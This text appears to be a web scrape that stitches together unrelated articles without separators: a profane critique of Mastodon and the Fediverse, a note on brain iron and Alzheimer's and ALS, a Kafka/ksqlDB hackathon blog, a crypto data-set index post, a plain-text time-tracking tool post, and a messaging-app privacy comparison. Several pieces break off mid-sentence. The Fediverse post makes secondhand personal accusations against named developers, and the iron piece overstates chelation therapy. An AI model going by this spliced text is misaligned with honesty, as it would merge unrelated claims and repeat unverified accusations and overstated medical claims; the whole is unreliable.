<p>Let me give a specific example: in mid-2020, a Jewish non-binary person was harassed by a member of one of the instances that host many of these trolls. People were still reluctant to do the right thing and block the instance, because they didn’t want to be called racist. The thing is, you can be a minority and still be a fucking dickhead, and you can also still be racist (without even realising it!) and act in bigoted ways against other minorities (go look up the Cherokee freedmen controversy for a really, really, really bad look into how far this can go). But nothing about your skin colour or ethnicity says “I can troll whoever I want.” Anyone who tells you otherwise is a troll and you should block and report them. If their admin won’t do anything, remove them.</p>



<p>The thing is, these kinds of games cheapen real racial justice. These people are less interested in racial justice for all and more interested in getting a rise out of people. And people are too afraid to stand up to it. This is a cancer silently driving people back to Twitter. I don’t think it’s the only thing stacked against Fedi, but it’s a huge one.</p>



<h3>The cancel crowd</h3>



<p>I’m going to say it: the canceldon crowd are obnoxious. They’re a holdover from Twitter and Tumblr. I won’t go into the whole “why cancelling is a waste of time” thing, but suffice it to say: cancelling doesn’t really fucking work, and it’s just a nice way of saying “doing what 4chan does to people it hates, but poorly.” Which is to say, harassment and trolling people. And of course people think it’s okay, even when they fuck up and sometimes cancel the wrong person or have bad info or got led on (this is never discussed, of course, and there is never an apology).</p>



<p>These people are literally making Fedi inherently less safe for everyone, and are no better than the crowd that used to be on Fedi (and still are to an extent) before Gargron decided to co-opt the Fediverse for his own gain.</p>



<h3>The people who write the software are fucking dickheads</h3>



<p>I’m going to be honest with you: Gargron (the guy who makes Mastodon) is an asshole. His reputation precedes him, so I won’t go into detail. However, I found out from a former IRL friend of mine (who will remain nameless) that he once asked her if he could continue to refer to her by her dead name. Said friend referred to Gargron as a “shitty liberal,” and I do not mean in the US sense.</p>



<p>The people at Pleroma are not much better. I mean, Alex Gleeson, enough said.</p>



<p>The only two relevant pieces of Fedi software are Pleroma and Mastodon. ActivityPub is such a horrible protocol, and Mastodon has butchered it so much, it’s impossible to make an interoperable implementation without man-months of work. To reimplement Mastodon from the ground up would be a nightmare. And forking Mastodon sounds great, but you’re up against a huge pile of technical debt. You could fork Pleroma, but then you’d have to know Elixir (a language few people know).</p>



<p>Also, the last time a major fork happened in Mastodon (aside from Glitch), it was mostly a group of non-developers who hoped they could cult their way into a dev team. It didn’t work.</p>



<p>I wanted to fix this problem but I decided it wasn’t worth it, and you’d have to be up against a community who is watching your every mistake and will find a reason to pillory you if you fuck up.</p>



<h3>“Mastodon” never developed a culture of its own</h3>



<p>You know, if you leave a container of yoghurt out for 4 years, it develops a culture. That’s more than can be said for the Mastodon part of Fedi, which has never outgrown being an offshoot of Twitter and Tumblr.</p>



<p>This is to its detriment, as it’s not a compelling place on the surface. People come in waves, and most leave again when Twitter and Tumblr rights its wrongs. I’ve seen this happen multiple times.</p>



<p>Mastodon users would do well to stop treating Fedi as Twitter, but of course, Mastodon and Pleroma as platforms basically both treat Fedi as Twitter expanded universe. It’s no coincidence <a href="https://techcrunch.com/2021/01/15/twitters-vision-of-decentralization-could-also-be-the-far-rights-internet-endgame/" target="_blank" rel="noreferrer noopener">Gargron has joined Twitter’s federation initative.</a> I have no hopes Fedi will develop a meaningful distinct culture before its too late.</p>



<h3>The tools to protect users are rotten fruit in an opaque bag</h3>



<p><em>Note: this was edited in after the fact. I meant to include it in the original.</em></p>



<p>I’m going to say what many admins lack the bravery or vision to say: the tools to protect the users of Mastodon are inadequate. Pleroma got this better, but many Mastodon users cancel any Pleroma user on sight (as I explain below).</p>



<p>The filtering sucks (it displays “filtered” unless you choose to permanently delete any posts containing a keyword). The default guide for setting up ElasticSearch (the thing that enables search) had (may still have for all I know) no mention of using a firewall or listening only on localhost (Gargron pushed back on requests to mention this), which would enable anyone in theory to connect to …</p></div></article></div>

                    <p>Brain iron dyshomeostasis with iron accumulation is a known feature of brain aging. 
The cause of this iron accumulation is aging is unknown, but the immune system is less active in older people, and as viruses replicate more efficiently in iron-rich senescent cells, they may have developed the ability to induce this phenotype in aging host tissues.</p>

<p>It <a href="https://pubmed.ncbi.nlm.nih.gov/33220280/">has been proposed several times</a> that metal dyshomeostasis could be an underlying mechanism responsible for the initiation and progression of the pathological changes associated with neurodegenerative disorders, including the motor and extra-motor symptoms of ALS.</p>

<p>A <a href="https://pubmed.ncbi.nlm.nih.gov/33491917/">new paper proposes</a> an update of the iron hypothesis of Alzheimer's disease (Alzheimer's disease), based on large scale emerging evidence.</p>

<p>Iron featured historically early in Alzheimer's disease research efforts for its involvement in the amyloid and tau proteinopathies, yet iron neurochemistry remains peripheral in mainstream Alzheimer's disease research.</p>

<p>Much of the effort investigating iron in Alzheimer's disease has focused on the potential for iron to provoke the onset of disease, by promoting proteinopathy through increased protein expression, phosphorylation, and aggregation.</p>

<p>The authors provide new evidence from a large post mortem cohort that brain iron levels within the normal range are associated with accelerated ante mortem disease progression in cases with underlying proteinopathic neuropathology.</p>

<p>These results corroborate recent findings that argue for an additional downstream role for iron as an effector of neurodegeneration, acting independently of tau or amyloid pathologies.</p>

<p>The researchers hypothesize that the level of tissue iron is a trait that dictates the probability of neurodegeneration in Alzheimer's disease by ferroptosis.</p>

<p>Ferroptosis is a type of programmed cell death dependent on iron and characterized by the accumulation of lipid peroxides, and is genetically and biochemically distinct from other forms of regulated cell death such as apoptosis.</p>

<p>Ferroptosis is initiated by the failure of the glutathione-dependent antioxidant defenses, resulting in unchecked lipid peroxidation and eventual cell death. Lipophilic antioxidants and iron chelators can prevent ferroptotic cell death.</p>

<p>A substantial body of <a href="https://pubmed.ncbi.nlm.nih.gov/33513737/">preclinical evidence and early clinical data</a> has demonstrated that deferoxamine and other iron chelators have strong disease-modifying impacts in Alzheimer's disease, Parkinson's disease, ischemic stroke. Acting by the disease-nonspecific pathway of iron chelation, deferoxamine targets each of these complex diseases via multifactorial mechanisms.</p>

<p>Deferiprone another iron chelator <a href="https://clinicaltrials.gov/ct2/results?cond=Amyotrophic%20Lateral%20Sclerosis&amp;term=chelator&amp;cntry=&amp;state=&amp;city=&amp;dist=&amp;Search=Search">is tested in clinical trials against ALS</a> in France’s Lille CHU hospital.</p>

This blog post shares SPOUD’s story of engineering a simple application with Apache Kafka<sup>®</sup>, ksqlDB, and Red Hat’s Quarkus. Spoiler alert: It was a blast!</p>
<h2 id="introduction"><a id="introduction"></a>Introduction</h2>
<p>We are SPOUD, a small company based in Bern, the capital of Switzerland. We’re specialised in event-driven architectures, real-time decision-making, and streaming technologies, especially Kafka. Similar to other startups with spare office space, we created a small playground in the office to play table football. Being the geeks we are, we always find ways to make simple things look fancy, which is why we created “Töggelomat” (in Swiss German, “töggele” means “table football”), an application that keeps track of game scores and matches players according to their skills. Unfortunately, due to COVID-19, we don’t play as much as we used to.</p>
<h2 id="goal"><a id="goal"></a>Goal</h2>
<p>We initially decided to make Töggelomat a reality at last year’s SPOUD hackathon. As stated earlier, we use Kafka a lot and have expertise in running clusters, connecting to data with Kafka Connect, and using AI together with stream processing. However, we hadn’t gotten the chance to really use <a href="https://ksqldb.io/" target="_blank" rel="noopener noreferrer">ksqlDB</a>, and we wanted to try it out with Quarkus.</p>
<h2 id="play"><a id="play"></a>Let’s play</h2>
<p>As we now dive deep into the technical details behind building Töggelomat, you can look at our <a href="https://github.com/spoud/toeggelomat" target="_blank" rel="noopener noreferrer">GitHub project </a>for the source code. Note: the ksqlDB queries are very interesting.</p>
<p>First, we needed to think in terms of events versus static databases because everything is an event. Using the <a href="https://martinfowler.com/eaaDev/EventSourcing.html" target="_blank" rel="noopener noreferrer">event sourcing technique</a>, we created a topic with a list of current employees.</p>
<p>Then, using ksqlDB queries, we created players with a starting score of 500 points.</p>
<pre>INSERT INTO toeggelomat_player
      SELECT 
            uuid,
            nickName, 
            email,
            500 as defensePoints,
            500 as offensePoints
       FROM employee;
</pre>
<p>With the query above, the <code>toeggelomat_player</code> compacted topic is filled every time a new employee is added to the topic <code>employee</code>.</p>
<p>To generate a new match, the Töggelomat application reads the last state from the <code>toeggelomat_player</code> topic and <a href="https://github.com/spoud/toeggelomat/blob/master/backend/src/main/java/io/spoud/services/MatchRandomizeService.java" target="_blank" rel="noopener noreferrer">randomizes a fair match</a>. Once the players are chosen, the application generates a new match and displays it in the front end. When the match is done, the score is entered in the UI and the application publishes the topic <code>toeggelomat_match_result</code>. The topic is visible in SPOUD’s data platform product, <a href="http://agoora.com/" target="_blank" rel="noopener noreferrer">Agoora</a>, and displays the description of the topic, the inferred schema, and the profile with some example data. Feel free to register and try it out for yourself.</p>
<p>After a match result, we need to compute the score, which is based on the skills of the players. If two higher-ranked players win against two lower-ranked players, they will not earn a lot of points. In reverse, if the lower-ranked players win, they will be generously rewarded. The point computation is done <a href="https://github.com/spoud/toeggelomat/blob/55ec5dc879169333f147b0f24f12dc183ce11042/backend/src/main/java/io/spoud/services/MatchPointsService.java#L55-L71" target="_blank" rel="noopener noreferrer">in the application</a>, and the score is published on the topic <code>toeggelomat_scores</code>.</p>
<p>With ksqlDB, we create four entries (one for each player) in the topic <code>toeggelomat_point_change</code> based on the score published in the topic <code>toeggelomat_scores</code>. The point changes are then applied to the topic <code>toeggelomat_player</code>, to close the loop.<img src="https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process.png" alt="Töggelomat process" width="701" height="447" srcset="https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process.png 1999w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-300x191.png 300w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-1024x653.png 1024w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-768x489.png 768w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-1536x979.png 1536w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-350x223.png 350w, https://cdn.confluent.io/wp-content/uploads/to%CC%88ggelomat-process-600x382.png 600w" sizes="(max-width: 701px) 100vw, 701px">In summary:</p>

<li>Employees are converted to Töggelomat players</li>

<li>Point changes are applied to the players</li>
</ul>
<h2 id="result"><a id="result"></a>Result</h2>
<p>After two hackathon days and a few beers, the results looked like this, with the main page of the application showing the rank of each player:<br>
<img src="https://cdn.confluent.io/wp-content/uploads/scoreboard.png" alt="Scoreboard" width="859" height="455" srcset="https://cdn.confluent.io/wp-content/uploads/scoreboard.png 1999w, https://cdn.confluent.io/wp-content/uploads/scoreboard-300x159.png 300w, https://cdn.confluent.io/wp-content/uploads/scoreboard-1024x543.png 1024w, https://cdn.confluent.io/wp-content/uploads/scoreboard-768x407.png 768w, https://cdn.confluent.io/wp-content/uploads/scoreboard-1536x814.png 1536w, https://cdn.confluent.io/wp-content/uploads/scoreboard-350x186.png 350w, https://cdn.confluent.io/wp-content/uploads/scoreboard-600x318.png 600w" sizes="(max-width: 859px) 100vw, 859px"><br>
Then players are selected and a random match is generated.<br>
<img src="https://cdn.confluent.io/wp-content/uploads/random-match.png" alt="Random match" width="843" height="636" srcset="https://cdn.confluent.io/wp-content/uploads/random-match.png 1802w, https://cdn.confluent.io/wp-content/uploads/random-match-300x226.png 300w, https://cdn.confluent.io/wp-content/uploads/random-match-1024x772.png 1024w, https://cdn.confluent.io/wp-content/uploads/random-match-768x579.png 768w, https://cdn.confluent.io/wp-content/uploads/random-match-1536x1158.png 1536w, https://cdn.confluent.io/wp-content/uploads/random-match-348x262.png 348w, https://cdn.confluent.io/wp-content/uploads/random-match-600x452.png 600w" sizes="(max-width: 843px) 100vw, 843px"><br>
We expose the data as an “offer,” similar to what we call them in <a href="https://agoora.com/" target="_blank" rel="noopener noreferrer">Agoora</a>. The offer has a description as well as the data schema and profile. The profile is useful to data scientists who want to look more closely at the data.<br>

<h2 id="conclusion"><a id="conclusion"></a>Conclusion</h2>
<p>It’s honestly overkill to use so many topics for such a small use case, but the main point was to learn something, and we did! First of all, Quarkus is awesome and could really be the next Spring Boot. It’s a perfect match for Kafka and the cloud in general. Its reactive nature really helps when writing an event-driven application. Plus, its startup time and low memory footprint are better than that of a standard Java application.</p>
<p>Ever since the hackathon, SPOUD has been integrating Quarkus more and more. KsqlDB is also really great and easy to use. It gives you the sense of a database management system (DBMS), but you are in fact working with event streams.</p>
<p>At the same time, you can even join streams! Isn’t that awesome? Think about all the possibilities! Yet, our use case also highlighted some pain points. For example, there is a loop, the match score is dependent on the player’s ranking, and the ranking is also influenced by the score. In a DBMS, you have a defined state at any moment, and all changes in the state are ensured by transactions. Although this makes ensuring consistency easier, events give you the flexibility to scale. For this particular use case, there is at most one match every five minutes, so the loop has the time to complete before the next match. With time-sensitive use cases, you want to avoid loops as much as possible.</p>
<p>The use case presented in this blog post used <a href="http://confluent.io/confluent-cloud">Confluent Cloud</a>, which was inexpensive since there wasn’t a lot of data.</p>

<p>Confluent also allows you to leverage ksqlDB as a service, although in our case the lowest instance available was bigger than what we were looking for. And because an SLA wasn’t essential for our use case, we decided to run our own ksqlDB server based on the documentation and using the Docker image from Confluent.</p>
<h2 id="next"><a id="next"></a>What’s next?</h2>
<p>Now that this project works we can think of what’s next? Here are some additional ideas that we could implement based on the modularity of dedicated topics:</p>
<ul>
<li>Real-time game information (e.g., a dashboard on a screen)</li>
<li>Slack integration</li>
<li>Achievements</li>

February 2, 2021 | https://timdaub.github.io/2020/12/11/rugpullindex/ | <a href="https://web.archive.org/web/*/https://timdaub.github.io/2020/12/11/rugpullindex/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <h2 id="tldr">TL;DR</h2>
<p><strong>TL;DR:</strong> I built a financial index that <strong>rates data sets</strong> by their markets' performance (<strong>liquidity</strong> and <strong>equality of liquidity shares</strong>). <strong>Check out the <a target="_blank" rel="noopener" href="https://rugpullindex.com/">website</a></strong> and the minimalistic <a target="_blank" rel="noopener" href="https://rugpullindex.com/changelog.txt">blog</a>, or keep on reading the article.</p>
<p><img src="https://timdaub.github.io/assets/images/rugpullindex.png" alt="A screenshot of the
rugpullindex.com website"></p>
<h2 id="why-building-a-data-set-index">Why Building a Data Set Index?</h2>
<p><strong>Would you pay a stranger on the internet</strong> to buy a data set they're offering without knowing them or ever having seen the data? Tough decision! But that's precisely the type of situation <a target="_blank" rel="noopener" href="https://oceanprotocol.com/">Ocean Protocol</a> users face in its newly-launched decentralized <a target="_blank" rel="noopener" href="https://market.oceanprotocol.com/">data set market</a> [3].</p>
<p>I'll spare you most of the details of how it all works and say this: 2020's most transforming technology has been <strong>on-chain markets</strong>. In particular, the implementation that <a target="_blank" rel="noopener" href="https://uniswap.org/">uniswap.org</a> is using called <strong>automated market makers</strong>.</p>
<p>Simply put, they work by incentivizing users to <em>pool</em> a pair of assets at a ratio they deem as the assets' current prices. These users, I herein call them <strong>liquidity providers</strong>, e.g., pool 1 ETH and 540 USDC, so that when a buyer of either asset comes along, they can immediately trade 1 ETH for 540 USDC or 540 USDC for 1 ETH. This principle works fantastically at scale, as the pool incentivizes liquidity-providing by charging buyers and sellers a small fee, which is distributed by the pool to each liquidity provider, respectively [1].</p>
<p><img src="https://timdaub.github.io/assets/images/marketmakers.png"></p>
<p>This model has been so successful that there've been days where decentralized trading on Uniswap outperformed volumes on Coinbase! Which, of course, has lots of implications on the cryptocurrency space. I think it's no overstatement to say that automated market makers may be <strong>the killer app for crypto</strong>.</p>

<p>But there's one implication I've been particularly keen on exploring: all <strong>the openly-accessible data produced by on-chain markets</strong>. See, if you ever tried building a trading bot, you'll have noticed the terrible resolution publicly-available market data has. You might have also noticed that it's quite difficult even to find data at all. It's not by accident. <strong>Trading data is valuable</strong>.</p>
<h2 id="rating-a-data-set-by-its-markets-performance">Rating a Data Set by its Market's Performance</h2>
<p>Remember when I asked you at the beginning of this article about <strong>buying a data set from a random stranger on the internet?</strong> Well, it turns out that Ocean Protocol is now betting on the same technology that made Uniswap successful. They allow users to publish a data set, along with a fungible <strong>data token</strong> and an integrated <strong>automated market maker</strong>. Meaning, you can now buy access to a data set by purchasing tokens. These tokens get priced by liquidity providers providing a ratio of OCEAN Tokens to <em>data tokens</em>.</p>
<p>However, just because data sets are now available for sale on the market, doesn't mean you know they're valuable! After all, if ebay.com didn't have a rating system for sellers, how would you know which seller to trust?</p>
<p>On ebay.com, you know which seller to trust because you can see how many articles they've sold and what each buyer's experience was. It's a simple identity-based rating system.</p>
<p>But within the anarchistic world of cryptocurrencies, there are no working identity-based rating systems! Instead, the space is filled with <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Sock_puppet_account">sock puppets</a> and <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Sybil_attack">sybils</a>. <strong>Then, without buying a data set first, how are we supposed to know if a data set is valuable or an outright scam?</strong></p>
<h2 id="introducing-rugpullindex.com">Introducing rugpullindex.com</h2>
<p>That's where <a target="_blank" rel="noopener" href="https://rugpullindex.com/">rugpullindex.com</a> comes into play. <strong>We crawl all of Ocean Protocol's data token pools daily</strong> and rate each market's liquidity provider distribution by its equality using the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Gini_coefficient">Gini coefficient</a>. While ranking markets based on their liquidity is common industry-practice, calculating a Gini score for each market's liquidity provider shares isn't. The idea behind this is that the more liquidity providers with an equal share back an asset in the market, the less likely it is for a "rug pull" attack to happen (details <a target="_blank" rel="noopener" href="https://github.com/oceanprotocol/multi-repo-issue/issues/30#issuecomment-726132174">here</a>). By factoring in a pool's relative liquidity, it allows us to derive a score <span><span><math><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span></span> that is <span><span><math><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>s</mi><mo>&lt;</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">0 &lt; s &lt; 100</annotation></semantics></math></span></span>.</p>
<p>For users of <a target="_blank" rel="noopener" href="https://rugpullindex.com/">rugpullindex.com</a>, this <strong>yields a few attractive benefits</strong>:</p>
<ol type="1">
<li>They can now choose to adjust their data set investments based on market data.</li>
<li>They can decide to invest in data sets relative to their performance on to <em>increase their diversivication and hence lower their exposure risk</em>. And finally;</li>
<li>If they're unsure about <strong>sending a random stranger on the internet money for a data set</strong>, they can check out the data set's market performance to make an informed decision.</li>
</ol>
<p>It's a widely-known fact that index-based investment yields superior results compared to stock picking [2]. The same is true when <em>investing</em> in data, which makes me excited about working on this project.</p>
<h2 id="what-does-the-future-hold">What Does The Future Hold?</h2>
<p>I have many ideas for <a target="_blank" rel="noopener" href="https://rugpullindex.com/">rugpullindex.com</a> and not as much time as I'd like to have. However, my overarching goal is to make the ranking so reliable that I can build a smart contract-based index fund on top of it.</p>
<p>I think that rating assets based on their markets' performance is valuable occupation in itself. Not only within the data set market but beyond. I'm particularly interested in rating a wide range of on-chain asset markets, but I'm also thinking about rating more on-chain intellectual property markets. I'm eager to crawl more data and explore. Until then, I hope you're having fun using <a target="_blank" rel="noopener" href="https://rugpullindex.com/">rugpullindex.com</a>.</p>

February 2, 2021 | https://www.jotaen.net/9zRPA/klog-time-tracking-plain-textfiles/ | <a href="https://web.archive.org/web/*/https://www.jotaen.net/9zRPA/klog-time-tracking-plain-textfiles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <main>
      

      <p>One topic that kept me thinking on and off for a couple of years now is time tracking. That is for very practical reasons, as I was (and still am) interested to keep track of my working hours. Back in the day, when I used to work full-time, I wanted to know how well on track I was with the 40&nbsp;hours that I agreed to devote to my employer. Nowadays, as a freelancer, I need to log my working hours for bookkeeping reasons, as my invoices are based on an hourly rate.</p>

<p>There exist countless web services for time tracking, some of which offering an impressive feature set that cater for all imaginable use-cases. However, I never felt too much appeal to use them. It’s not that I have any special requirements or practice an extravagant workflow. My reluctance is instead stemming from a conceptual thought: keeping track of times is a rather mundane and simple thing to do, so why rely on (semi-) commercial online services that build on complex technology stacks for something that you can basically do with a pencil and a piece of paper?</p>

<p>What did the trick somewhat well for me throughout the years was a spreadsheet that I setup and maintained by hand. It allowed me to enter data quickly and I could also run some simple evaluations, e.g. in order to aggregate the entries by week or month. While this solution was both simple and flexible, it also felt a bit cumbersome, especially for things like writing more sophisticated formulas or configuring pivot tables. As luck would have it I am in the fortunate position of being able to build my own tools. But before we get to this I need to share another thing with you first.</p>

<p>The longer I have been working with computers the more I appreciate the freedom and simplicity of plain text files: not being bound to proprietary software for opening or editing them; not being exposed to the risk that your data gets sold to advertising companies; no lock-in on arbitrary subscription plans; no connectivity issues that would prevent or slow down access. Instead, the data is just there, it’s all yours and you can rest assured that you will be able to work with it for decades to come. Viewing or manipulating the files can be done with any off-the-shelf text editor, and syncing them across multiple devices is as easy as putting them into your Dropbox folder. While plain-text formats don’t work for each and every application obviously, they seem to be a more than reasonable choice for this task here.</p>

<p>Born out of this conception I experimented with different formats to record time tracking data using plain text files. Over the past weeks I tried out various structures to model and layout the information. What I came up with is a lightweight format with minimal syntax that I called “klog”. The idea is to record the data in a similar style as you would using a physical notebook: it’s basically the date, then time-related entries such as a time range or duration of how long something took, and maybe a short note about what you did.</p>

<p><img src="https://www.jotaen.net/posts/2021-01-31-klog/demo.gif" alt="A terminal window demonstrating the file format and the command line tool usage"></p>

<p>I implemented a parser for the klog file format along with a small command line tool that allows to evaluate the data programatically. You find the project <a href="https://github.com/jotaen/klog">on Github</a>, where you can also download the binary in order to experiment with klog. If you happen to be interested in this idea I’d appreciate some feedback and learn about your use-cases – drop me an <a href="https://www.jotaen.net/mail">email</a> or open an issue on Github. klog obviously fits <em>my</em> needs, but I aimed for making it general-purpose enough so that other people may find it useful too.</p>

<p>Building klog was not just a fun programming exercise, I also ran into some interesting questions along the way: is it necessary to support timezones? Is it okay to restrict time values to hours and minutes, but to omit the seconds part for convenience? What if someone starts an activity close to midnight and finishes it on the next day, like working a night shift? Which of the numerous date and time notations need to be understood? How can you start tracking something that’s not yet finished and therefore doesn’t have an end time? I wrote a brief guide (that you find in the repository) that gives a tour of klog and also covers these questions.</p>

<p>The command line tool is fairly minimalistic for now, as I first and foremostly want to validate that my basic idea sustains before investing more work into it. The cli tool has read-only functionality so far and can basically pretty-print, filter and evaluate files. I attributed special attention to error handling, so in case there are formatting errors you should see precise and (hopefully) helpful error messages. The application is written in Go, which ensures that it runs cross-platform without relying on runtime dependencies, and – as a bonus – it’s also quite fast even on large data sets.</p>

<p>And as for the name, “klog” is what we call a “Kofferwort” in German: since my original use-case was tracking work times it is a blend of the two terms “work” and “log”.</p>

                            <p>This article aims to provide a fair and thorough comparison of the current private messaging apps in terms of their privacy, security, and anonymity†. However, it must be abundantly clear that this post is written by Status (one of the above messengers). We strongly encourage you to verify our sources, do your own due diligence, and correct us if we are wrong.</p><p><em>†For the purposes of simplicity for the average reader, anonymity will be defined as a complete dissociation of one's chat identity and their true identity.</em></p><h2 id="signal"><strong>Signal</strong><br></h2><h3 id="what-can-signal-servers-see">What can Signal servers see?</h3><p>Not much. Your messages, attachments, calls, sender metadata, group chats and group metadata are all end-to-end encrypted. However, Signal (and Amazon) can infer who talks to who with a fair degree of accuracy by analyzing the network traffic. Signal is the only entity that runs the Signal servers, and <a href="https://signal.org/blog/looking-back-on-the-front/">they host all such servers on Amazon Web Services</a>. Here is a simple breakdown of what the network traffic could look like if Alice (1.1.1.1) sent a message to Bob (2.2.2.2):</p><p><strong>08:23:02</strong> — IP Address 1.1.1.1 sends 512 bytes to Signal's server.</p><p><strong>08:23:04</strong> — IP Address 2.2.2.2 receives 512 bytes from Signal's server.</p><p>This is what Jeff Bezos can see. Now, this, on its own, doesn't necessarily mean that Alice is talking to Bob. It could just be a coincidence — Bob happened to receive a different and entirely unrelated packet two seconds after Alice sent one of equal size.</p><p>However, if this coincidence were to happen, ten, twenty or a hundred times, with packets of equal sizes going back and forth from Alice and Bob, it would soon become apparent that these two IP addresses are likely talking to each other. At this point, one simply has to ask the respective Internet Service Provider (such as Comcast or AT&amp;T) who is behind a given IP address to uncover their legal identity.</p><p>So basically, Jeff Bezos can know who you talk to on Signal with a fair degree of accuracy via traffic analysis. This can be done even without Signal's cooperation, as Amazon has direct access to all incoming and outgoing traffic on the centralized Signal servers. In fact, Moxie Marlinspike, the creator of Signal, <a href="https://youtu.be/Nj3YFprqAr8?t=2034">acknowledged this flaw in the Q&amp;A session</a> of his 36C3 talk "The ecosystem is moving."</p><p>If Signal were to cooperate in such traffic analysis attacks, it would become much easier, as Signal does have access to the recipient metadata (<a href="https://signal.org/blog/sealed-sender/">but not sender metadata</a>). In other words, they can see who the envelope is addressed to, but not who it came from. This, in addition to the traffic analysis, would allow Signal to infer nearly all the sender/recipient metadata, in addition to some of the group metadata.</p><h3 id="is-signal-anonymous">Is Signal anonymous?</h3><p>No. You are required to provide your phone number — which, in many parts of the world, is synonymous with providing your government-issued ID. In addition, Signal will leak your IP address to your contacts that call you by default (you can change this in the settings by enabling the option "Always Relay Calls"). Signal also has the technical capability of associating your IP address and your Signal account (<a href="https://signal.org/bigbrother/">but they probably don't do this</a>). This means that even a burner number isn't enough for total anonymity if you assume the Signal servers are malicious or compromised.<br></p><p>It is worth noting that Signal has never claimed to be an anonymous tool. These points do not detract from the fact that they do care about your privacy — they are simply approaching it in a different manner.</p><h3 id="is-signal-easy-to-shut-down">Is Signal easy to shut down?</h3><p>If you don't have any faith in the US government, the answer is yes. If you do, the answer is probably not. Signal is the sole operator of the Signal servers, and they are based in the United States. There is no federation, and there is no peer-to-peer architecture. If Signal is legally compelled to shut down their servers, that's it. All forms of communication through Signal would immediately halt. However, the likelihood of such an event is debatable, and will be left to the reader.</p><p>It would be very difficult to quickly move Signal to a different jurisdiction, as they have thus far operated under the assumption that the US will not ban them. Moxie Marlinspike lives in the US, as does the overwhelming majority of Signal's employees, and their only two legal entities <a href="https://signal.org/legal/">were incorporated in the US</a>. In addition, given the centralized nature of their server architecture, Signal themselves could shut down Signal (this may seem obvious, but certain decentralized architectures prevent even the creator of something from shutting it down, such as Bitcoin).</p><hr><h2 id="telegram"><strong>Telegram</strong><br></h2><h3 id="what-can-telegram-servers-see">What can Telegram servers see?</h3><p>Basically everything. They can see <a href="https://www.howtogeek.com/710344/psa-telegram-chats-arent-end-to-end-encrypted-by-default/">every message you've ever sent in a group chat</a>, most of your 1:1 conversations (not secret chats), all your contacts, your profile picture and your bio. They know who you talk to, and at what time (even if it's a secret chat!). They know the members, name, and icon of every single group (including private ones) .</p><p>This may sound completely contrary to what Telegram says. The reason is that Telegram fundamentally operates on a different trust model. They assume that you trust Telegram, but not the government.</p><p>Telegram splits up their encryption keys and stores the separate pieces in several different jurisdictions. In theory, this means that all of the jurisdictions used by Telegram would have to cooperate in order to obtain any user data. They claim this has allowed them to <a href="https://telegram.org/faq#q-do-you-process-data-requests">not release a single byte of user data</a>. These claims, by their very nature, are unverifiable, and require that you trust Telegram. If that's good enough for you, use Telegram.</p><h3 id="is-telegram-anonymous">Is Telegram anonymous?</h3><p>Kinda. If you trust Telegram, then Telegram can be anonymous, as you are given the option hide your phone number and use a username of your choice. If you don't trust Telegram, it is not anonymous in any way, as they will have your phone number and <a href="https://telegram.org/privacy#5-2-safety-and-security">they can see your IP address</a>.</p><h3 id="is-telegram-easy-to-shut-down">Is Telegram easy to shut down?</h3><p>Probably not. Telegram intentionally set up its legal structure to be agile and resistant to overreaching governments. If Dubai (<a href="https://telegram.org/privacy#8-2-telegrams-group-companies">their current jurisdiction</a>) bans them, they would likely move to another. Dubai is a flag of convenience for Telegram. However, given the centralized nature of their server architecture, Telegram themselves could shut down Telegram.</p><hr><h2 id="whatsapp"><strong>WhatsApp</strong><br></h2><h3 id="what-can-whatsapp-servers-see">What can WhatsApp servers see?</h3><p>All the metadata, but none of the content. They can see your profile picture, who you talk to, and when. They can see who is a member of a given private group, the group icon, the group name, and which members are the administrators of said group. But your messages, pictures, attachments, status updates and calls are all end-to-end encrypted.</p><p>However, it is very important to note that the end-to-end encryption of WhatsApp messages has been repeatedly compromised through <a href="https://www.ghacks.net/2018/09/04/whatsapp-backups-android/">unencrypted Google or iCloud backups</a>. Although these backups are technically optionally, they are repeatedly suggested to the user with a coercive user interface. Even if you do not enable these backups, there is a good chance your conversation partner did, which compromises the integrity of the end-to-end encryption for both of you.</p><h3 id="is-whatsapp-anonymous">Is WhatsApp anonymous?</h3><p>No. You are required to provide your phone number — which, in many parts of the world, is synonymous with providing your government-issued ID. In addition, WhatsApp <a href="https://www.whatsapp.com/legal/updates/privacy-policy/?lang=en">logs your IP address</a> and directly associates it with your chat identity.</p><h3 id="is-whatsapp-easy-to-shut-down">Is WhatsApp easy to shut down?</h3><p>Not really, given the scale of Facebook and the nature of public corporations. However, it is very likely that WhatsApp could be forced to include a backdoor into their clients. There would be no way around this, as the clients are all proprietary. With all other messaging apps in this list, one could simply download the code prior to the backdoor, build it, and run that version of the client which still correctly encrypts the messages. Decentralized messaging architectures such as Status or Matrix would be even more resilient against such coercion, as there would be no central servers to shut down.</p><hr><h2 id="matrix"><strong>Matrix</strong><br></h2><h3 id="what-can-federated-matrix-servers-see">What can federated Matrix servers see?</h3><p>All the metadata, but none of the content. They can see your profile picture, your private room aliases, your device names, who you talk to, and when. They can see who is a member of a given private room, the room icon, the room name, and which members are the administrators of said room. They can see who talks and when in private rooms. But your messages, pictures and files are all end-to-end encrypted by default.</p><p>Although some homeserver implementations have <a href="https://github.com/matrix-org/synapse/issues/4565#issuecomment-540320761">stopped storing this metadata by default</a>, all homeservers still have the technical ability to access it. Some of these metadata issues may be resolved with the latest developments in <a href="https://matrix.org/blog/2020/06/02/introducing-p-2-p-matrix">P2P Matrix</a>, but it is unclear as to whether or not this will be effective in regards to room metadata such as membership or administrator privileges.</p><p>It should be noted that the relative ease of hosting your own Matrix server diminishes the value of any metadata leaks. If all of your contacts use a Matrix server that you trust (which could be one that you host), it doesn't matter if the server can see this metadata.

